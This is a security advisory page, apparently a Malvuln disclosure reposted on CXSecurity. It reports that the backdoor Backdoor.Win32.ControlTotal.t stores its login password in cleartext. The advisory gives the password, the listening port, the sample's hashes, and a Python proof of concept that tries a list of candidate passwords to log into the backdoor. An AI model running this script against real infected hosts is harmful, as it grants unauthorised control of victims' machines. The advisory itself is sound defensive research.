---
title: Backdoor.Win32.ControlTotal.t / Insecure Credential Storage / MVID-2025-0702
url: https://cxsecurity.com/issue/WLB-2025120019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-21
fetch_date: 2025-12-22T03:27:58.392119
---

# Backdoor.Win32.ControlTotal.t / Insecure Credential Storage / MVID-2025-0702

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.ControlTotal.t / Insecure Credential Storage / MVID-2025-0702** **2025.12.21**  Credit:  **[malvuln](https://cxsecurity.com/author/malvuln/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2025
Original source: https://malvuln.com/advisory/6c0eda1210da81b191bd970cb0f8660a.txt
Malvuln Intelligence Feed: https://intel.malvuln.com/
Contact: malvuln13@gmail.com
Media: x.com/malvuln
Threat: Backdoor.Win32.ControlTotal.t
Vulnerability: Insecure Credential Storage
Description: The malware listens on TCP port 2032 and requires authentication. The password "jdf4df4vdf" is stored in cleartext within the PE file. We send using a custom client to validate the password, as the malware did not like nc64 likely due to CRLF characters.
Family: ControlTotal
Type: PE32
Attack-pattern TTP: Unsecured Credentials (T1552)
MD5: 6c0eda1210da81b191bd970cb0f8660a
SHA256: 25b46a418b4e0749f83d9439fd1f5b9e2e5dd0703398516ac750580a26c800d5
Vuln ID: MVID-2025-0702
Disclosure: 12/20/2025
Exploit/PoC:
from socket import \*
import time
#By John Page (aka hyp3rlinx)
#Backdoor.Win32.ControlTotal.t
#MD5: 6c0eda1210da81b191bd970cb0f8660a
#
MALWARE\_HOST="x.x.x.x"
PORT=2032
candidates = [
"cs4sd65F",
"5s64jhbk",
"54asD54s",
"SDd54F7j",
"5fh4dhhg",
"df2gdfg2",
"AS45aas7",
"D54SDFfh",
"jdf4df4vdf", #Password Here
"sdf21fsd",
"dgv2fd",
"annsk33",
"20022okkd"
]
def chk\_res(s, p=None):
failed = False
res = b''
while True:
chunk = s.recv(128)
if not chunk:
break
res += chunk
text = res.decode('latin-1', errors='ignore')
if "xaContraseña Incorrecta" in text:
failed = True
break
if not failed:
return p
return None
def backdoor\_login(passwd):
s=socket(AF\_INET, SOCK\_STREAM)
s.connect((MALWARE\_HOST, PORT))
s.send(passwd.encode())
result = chk\_res(s, passwd)
if result:
print("[\*] Password found: ", result)
else:
print("[!] Failed.")
return False
s.close()
return True
def main():
for x in candidates:
print("[-] Trying: ", x)
if backdoor\_login(x):
break
time.sleep(0.6)
if \_\_name\_\_ == "\_\_main\_\_":
main()
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120019)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top